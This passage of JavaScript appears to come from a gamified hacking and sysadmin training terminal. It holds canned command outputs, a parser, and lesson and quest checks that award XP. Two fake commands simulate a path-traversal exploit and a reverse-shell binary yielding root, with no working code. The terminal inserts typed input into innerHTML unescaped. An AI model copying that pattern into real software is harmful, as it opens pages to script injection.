    desc: "Cryptography and SSL/TLS Toolkit.",
    run: (args) => {
      if (args.includes("genrsa"))
        return "Generating RSA private key, 4096 bit long modulus...\n......................................................................................++\n........................++\ne is 65537 (0x010001)";
      if (args.includes("-dates"))
        return "notBefore=Oct 20 00:00:00 2024 GMT\nnotAfter=Oct 20 23:59:59 2026 GMT";
      if (args.includes("x509"))
        return "Certificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            1a:2b:3c:4d:5e:6f\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C = US, O = Enterprise Security Authority, CN = Secure Server";
      return "OpenSSL> ";
    },
  },
  lastlog: {
    desc: "Report the most recent login of all users or of a given user.",
    run: () =>
      "Username         Port     From             Latest\nroot             pts/1    10.0.0.99        Wed Oct 21 10:05:00 +0000 2026\nsysadmin         pts/0    192.168.1.100    Wed Oct 21 10:00:00 +0000 2026\ndaemon                                     **Never logged in**",
  },
  "./50383.py": {
    desc: "Execute custom Python exploit payload.",
    run: () =>
      "[+] Targeting 10.0.0.50...\n[+] Sending payload via Path Traversal...\n[+] Success! Remote Code Execution achieved.\nuid=0(root) gid=0(root) groups=0(root)",
  },
  "./shell.elf": {
    desc: "Compiled Reverse Shell ELF Binary.",
    run: () =>
      "Executing ELF binary...\n[+] Connection established to 10.0.0.99\n[+] Root shell spawned.\nuid=0(root) gid=0(root) groups=0(root)",
  },
};

const terminalOutput = document.getElementById("terminal-output");
const cmdInput = document.getElementById("cmd-input");

function printToTerminal(htmlContent, isCommand = false) {
  const div = document.createElement("div");
  div.className = "mb-1 leading-relaxed";
  if (isCommand) {
    div.innerHTML = `<span class="term-prompt">sysadmin@gemini</span>:<span class="term-path">${formatPromptPath()}</span>$ ${htmlContent}`;
  } else {
    div.innerHTML = htmlContent;
  }
  terminalOutput.appendChild(div);
  terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function executeCommand(rawCommand) {
  let cmdStr = rawCommand.trim();
  if (!cmdStr) return;
  printToTerminal(cmdStr, true);

  let args = cmdStr.match(/(".*?"|[^"\s]+)+(?=\s*|\s*$)/g) || [];
  let cmdName = args.shift();

  if (commands[cmdName]) {
    try {
      let output = commands[cmdName].run(args, cmdStr);
      if (output === "CLEAR_SIGNAL") {
        terminalOutput.innerHTML = "";
      } else if (output !== "") {
        printToTerminal(output);
      }

      // Verify
      let m = learningModules[activeModuleIndex];
      let l = m.lessons[activeLessonIndex];
      let lId = `${activeModuleIndex}_${activeLessonIndex}`;

      if (
        !playerStats.completedLessons.includes(lId) &&
        l.check(cmdName, args, output)
      ) {
        playerStats.completedLessons.push(lId);
        addXp(l.xp);
        printToTerminal(
          `<div class="my-2 p-2 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded text-xs">🏆 Objective Accomplished! +${l.xp} XP</div>`,
        );
        if (activeLessonIndex < m.lessons.length - 1) activeLessonIndex++;
        renderLesson();
      }

      quests.forEach((q) => {
        if (
          !playerStats.completedQuests.includes(q.id) &&
          q.check(cmdName, args, output)
        ) {
          playerStats.completedQuests.push(q.id);
          addXp(q.reward);
          printToTerminal(
            `<div class="my-2 p-2 bg-purple-500/10 text-purple-400 border border-purple-500/20 rounded text-xs">🔥 Quest Cleared: ${q.title}! +${q.reward} XP</div>`,
          );
          if (activeTab === "quests") renderQuests();
        }
      });
    } catch (e) {
      printToTerminal(`<span class="term-err">Execution Error.</span>`);
    }
  } else {
    printToTerminal(
      `<span class="term-err">${cmdName}: command not found</span>`,
    );
  }
}

function resetSandbox() {
  if (confirm("Hard reset? XP is saved, files are reset.")) {
    initVfs();
    document.getElementById("prompt-path").innerText = formatPromptPath();
    printToTerminal(
      "<span class='text-red-400 font-bold'>Reset Complete.</span>",
    );
  }
}

cmdInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    let cmd = cmdInput.value;
    if (cmd.trim() !== "") {
      commandHistory.push(cmd);
      historyIndex = commandHistory.length;
    }
    executeCommand(cmd);
    cmdInput.value = "";
  } else if (e.key === "ArrowUp") {
    if (historyIndex > 0) {
      historyIndex--;
      cmdInput.value = commandHistory[historyIndex];
    }
  } else if (e.key === "ArrowDown") {
    if (historyIndex < commandHistory.length - 1) {
      historyIndex++;
      cmdInput.value = commandHistory[historyIndex];
    } else {
      historyIndex = commandHistory.length;
      cmdInput.value = "";
    }
  }
});

document
  .getElementById("terminal-container")
  .addEventListener("click", () => cmdInput.focus());

window.onload = () => {
  initVfs();
  loadStats();
  renderModulesDropdown();
  renderLesson();
  cmdInput.focus();
};
